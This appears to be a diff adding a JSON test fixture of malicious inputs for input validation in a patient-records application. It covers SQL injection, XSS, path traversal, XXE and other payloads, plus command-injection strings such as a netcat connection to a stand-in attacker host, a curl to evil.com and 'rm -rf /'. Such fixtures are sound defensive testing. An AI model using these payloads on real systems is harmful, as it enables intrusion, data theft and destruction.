@@ -1,0 +1,97 @@
+{
+  "sqlInjection": [
+    "' OR '1'='1",
+    "'; DROP TABLE patients;--",
+    "' OR 1=1--",
+    "admin'--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "1' AND '1'='1",
+    "'; SELECT pg_sleep(5);--",
+    "' OR 'a'='a",
+    "\") OR (\"1\"=\"1",
+    "1; DROP TABLE patients"
+  ],
+  "xss": [
+    "<script>alert('xss')</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "javascript:alert(1)",
+    "<body onload=alert('xss')>",
+    "'\"><script>alert(1)</script>",
+    "<iframe src=javascript:alert(1)>",
+    "<a href=\"javascript:alert(1)\">click</a>",
+    "<div onmouseover=\"alert(1)\">hover</div>",
+    "%3Cscript%3Ealert(1)%3C/script%3E"
+  ],
+  "commandInjection": [
+    "; ls -la",
+    "| whoami",
+    "&& cat /etc/passwd",
+    "`id`",
+    "$(whoami)",
+    "; rm -rf /",
+    "| nc attacker.com 4444",
+    "; curl http://evil.com"
+  ],
+  "pathTraversal": [
+    "../../../etc/passwd",
+    "......windowssystem32configsam",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "/etc/passwd%00",
+    "..%252f..%252f..%252fetc%252fpasswd"
+  ],
+  "nullByteAndEncoding": [
+    "test name",
+    "test%00name",
+    "﻿test",
+    "test​name",
+    " ",
+    "%c0%ae%c0%ae/"
+  ],
+  "oversizedInput": [
+    {
+      "label": "10KB string",
+      "length": 10240
+    },
+    {
+      "label": "100KB string",
+      "length": 102400
+    },
+    {
+      "label": "1MB string",
+      "length": 1048576
+    }
+  ],
+  "unicodeAndInternational": [
+    "O'Brien-Muñoz",
+    "田中太郎",
+    "محمد الأحمد",
+    "Владимир Путин",
+    "🦷😀🔥",
+    "test‮reversed",
+    "Ⅷ Ⅸ Ⅹ"
+  ],
+  "formatStringAndTemplate": [
+    "%s%s%s%s%s",
+    "{{7*7}}",
+    "${7*7}",
+    "#{7*7}",
+    "%n%n%n%n",
+    "{{constructor.constructor('alert(1)')()}}"
+  ],
+  "ldapInjection": [
+    "*)(uid=*))(|(uid=*",
+    "*)(|(password=*))",
+    "admin)(&(password=*))"
+  ],
+  "xmlInjection": [
+    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "<?xml version=\"1.0\"?><root></root>"
+  ],
+  "noSqlInjection": [
+    "{\"$gt\": \"\"}",
+    "{\"$ne\": null}",
+    "'; return true; var x='"
+  ]
+}
